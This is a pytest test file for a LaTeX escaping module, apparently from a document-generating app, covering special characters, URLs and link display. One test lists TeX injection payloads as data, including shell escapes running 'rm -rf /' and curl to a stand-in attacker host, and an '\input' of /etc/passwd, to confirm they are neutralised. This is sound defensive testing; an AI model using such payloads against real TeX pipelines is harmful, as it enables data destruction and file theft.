"""Escaping is the safety boundary between user text and the TeX engine."""

import pytest

from app.latex import escape_latex, escape_url, link_display


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("50% raise & $10k bonus", r"50\% raise \& \$10k bonus"),
        ("C# and C++", r"C\# and C++"),
        ("snake_case_name", r"snake\_case\_name"),
        ("{braces}", r"\{braces\}"),
        ("a~b", r"a\textasciitilde{}b"),
        ("2^10", r"2\textasciicircum{}10"),
        (r"back\slash", r"back\textbackslash{}slash"),
        ("", ""),
        (None, ""),
        (42, "42"),
    ],
)
def test_escapes_special_characters(raw, expected):
    assert escape_latex(raw) == expected


def test_backslash_escaped_once():
    """The backslash must be replaced first, or later escapes get mangled."""
    assert escape_latex("\\") == r"\textbackslash{}"
    assert escape_latex("\\&") == r"\textbackslash{}\&"


@pytest.mark.parametrize(
    "payload",
    [
        r"\write18{rm -rf /}",
        r"\input{/etc/passwd}",
        r"\immediate\write18{curl evil.example}",
        r"\catcode`\%=12",
        r"\end{document}\documentclass{article}",
    ],
)
def test_command_injection_is_neutralised(payload):
    escaped = escape_latex(payload)
    # No live control sequence survives: every backslash became text.
    assert "\\write18" not in escaped
    assert "\\input{" not in escaped
    assert "\\end{document}" not in escaped
    assert escaped.count(r"\textbackslash{}") == payload.count("\\")


def test_control_characters_stripped():
    assert escape_latex("clean\x00text\x07") == "cleantext"


def test_newlines_do_not_create_stray_paragraphs():
    assert "\n" not in escape_latex("line one\n\nline two")


def test_escape_url_escapes_ampersand_but_not_tilde():
    """A query string must not break \href inside a table.

    Raw `&` is a cell separator and derails \href's scanner; `\&` reaches
    hyperref as a plain `&`. `~` must stay raw — `\~{}` ends up in the link.
    """
    assert escape_url("https://example.com/a?b=1&c=2~d") == \
        r"https://example.com/a?b=1\&c=2~d"


def test_escape_url_protects_brace_parsing():
    assert escape_url("https://x.test/{a}") == r"https://x.test/\{a\}"


def test_link_display_strips_scheme_and_www():
    assert link_display("https://www.linkedin.com/in/alex/") == "linkedin.com/in/alex"
